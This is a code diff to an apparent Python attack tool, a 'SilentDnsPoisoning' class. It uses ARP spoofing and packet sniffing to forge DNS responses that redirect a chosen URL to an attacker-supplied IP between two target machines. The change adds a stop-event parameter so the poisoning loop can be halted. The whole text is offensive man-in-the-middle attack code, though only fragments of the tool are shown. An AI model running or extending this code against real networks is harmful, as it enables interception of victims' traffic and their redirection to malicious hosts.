@@ -9,7 +9,7 @@ class SilentDnsPoisoning:
     def __init__(self, intFace):
         self.interface = intFace
 
-    def doPoison(self, target1, target2, target1MAC, target2MAC, url, ipPoison, timeSleep):
+    def doPoison(self, target1, target2, target1MAC, target2MAC, url, ipPoison, timeSleep, stop_event):
 
         def makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison, interface):
             if pkt.haslayer(IP) and pkt.haslayer(Ether):
@@ -74,7 +74,7 @@ class SilentDnsPoisoning:
                             break
                     if found:
                         sendp(pkt, iface=interface)
-                        
+
         arpSpoofing = ArpSpoofing(self.interface)
         try:
             print("before thread")
@@ -86,7 +86,7 @@ class SilentDnsPoisoning:
         except:
             print("Thread arp failed to start")
 
-        while True:
+        while not stop_event.is_set():
             sniff(count=1, store=0,
                   prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison,
                                                  self.interface), iface=self.interface)
